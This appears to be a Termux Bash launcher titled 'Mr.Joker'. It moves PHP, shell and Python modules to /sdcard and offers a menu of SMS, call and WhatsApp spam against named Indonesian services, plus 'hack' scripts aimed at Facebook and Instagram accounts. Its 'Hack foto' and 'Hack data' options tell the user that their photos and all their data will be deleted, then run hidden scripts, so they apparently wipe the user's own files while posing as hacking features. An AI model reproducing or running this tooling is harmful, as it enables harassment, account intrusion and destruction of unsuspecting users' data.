# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'


mv -f modul/a.php /sdcard
mv -f modul/b.php /sdcard
mv -f modul/c.php /sdcard
mv -f modul/d.php /sdcard
mv -f modul/e.php /sdcard
mv -f modul/f.sh /sdcard
mv -f modul/g.sh /sdcard
mv -f modul/fblx.py /sdcard
mv -f modul/iglx.py /sdcard
mv -f modul/log.py /sdcard
mv -f joker.sh /sdcard | lolcat


figlet Mr.Joker  | lolcat

echo -b "____________________________________________________________"
echo -b "TOOLS JOKER$green " |lolcat
echo -b "====================================="
echo -b "MR.JOKER              Why So Serius?" | lolcat
echo -b "====================================="
echo -b "FB:MR.JOKER    Ig:@Coretan.Bermakna_" | lolcat
echo -b "====================================="
echo -b "Author:Mr. Joker" | lolcat
echo -b "____________________________________________________________"

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo -e $b "1. Spam WhatsApp${enda}";
echo -e "============================" | lolcat
echo -e $b "2. Spam Telpon (Tokopedia)${endcla}";
echo -e "============================" | lolcat
echo -e $b "3. Spam Sms (Telkomsel)${enda}";
echo -e "============================" | lolcat
echo -e $b "4. Spam Sms (PHD)${enda}";
echo -e "============================" | lolcat
echo -e $b "5. Spam Sms (Hooq)${enda}";
echo -e "============================" | lolcat
echo -e $b "6. Hack Facebook Target ${enda}";
echo -e "============================" | lolcat
echo -e $b "7. Hack Instagram Target ${enda}";
echo -e "============================" | lolcat
echo -e $b "8. Install Bahan Bahan${enda}";
echo -e "============================" | lolcat
echo -e $b "9. Hack foto${enda}";
echo -e "============================" | lolcat
echo -e $b "10. Hack data${enda}";
echo -e "============================" | lolcat
echo -e $b "logout${enda}";
echo -e "============================" | lolcat
echo -e "~MR.JOKER~ [PILIH AJA NOMERNYA]" | lolcat
read -p "~" pil;

# Nmap

case $pil in
1)
python2 log.py
php a.php
;;

2)
php b.php
;;

3)
php c.php
;;

4)
python2 log.py
php d.php
;;

5)
python2 log.py
php e.php

;;

6)
python2 fblx.py

;;

7)
python2 iglx.py

;;

8)
echo "Tunggu Sebentar" | lolcat
sleep 2
echo "Loading..." | lolcat
sleep 1
pkg update && pkg upgrade
pip2 install lolcat
pkg install toilet
pip2 install mechaniz
pkg install python2
pkg install php
;;
9)
echo "foto anda akan segera dihapus" | lolcat
echo "Why So Serius?" | lolcat
echo "😎"
sleep 1
sh f.sh
;;

10)
echo "Semua Data Anda Akan Segera Dihapus" | lolcat
echo "Why So Serius?" | lolcat
echo "😎"
sleep 1
sh g.sh
;;

logout)
echo "By Learning You Know Everythink" | lolcat
echo "Thank you for using this tool" | lolcat
echo "~MR.JOKER~" | lolcat
exit

;;

*) echo "Sorry, Your choices it's not already"
esac
done
done
